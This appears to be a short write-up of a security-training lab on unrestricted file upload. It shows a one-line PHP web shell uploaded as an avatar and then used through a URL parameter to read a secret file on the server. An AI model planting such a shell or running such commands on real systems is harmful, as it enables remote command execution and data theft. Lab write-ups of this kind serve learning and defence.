
**Goal:** Upload a PHP web shell and read the file `/home/carlos/secret`.

**Vulnerability:** File Upload — the site allows file uploads without validating the file type.

---

## Steps taken:

1. Logged into my account on the lab website.
2. Navigated to the `/my-account/avatar` page.
3. Created a PHP file named `shell.php`:
<?php system($_GET['cmd']); ?>
Uploaded it via the form.

The response indicated:

The file avatars/shell.php has been uploaded.
Accessed the uploaded file in the browser:

https://<lab-id>.web-security-academy.net/files/avatars/shell.php
Executed a command to read the flag:

https://<lab-id>.web-security-academy.net/files/avatars/shell.php?cmd=cat /home/carlos/secret
Retrieved the flag.

Payload:
<?php system($_GET['cmd']); ?>

Why it worked:
The site did not validate the type of the uploaded file.

The PHP file was saved in the `avatars/` directory.

The server executes the PHP code when the file is accessed.

Arbitrary commands can be executed on the server via the `cmd` parameter.
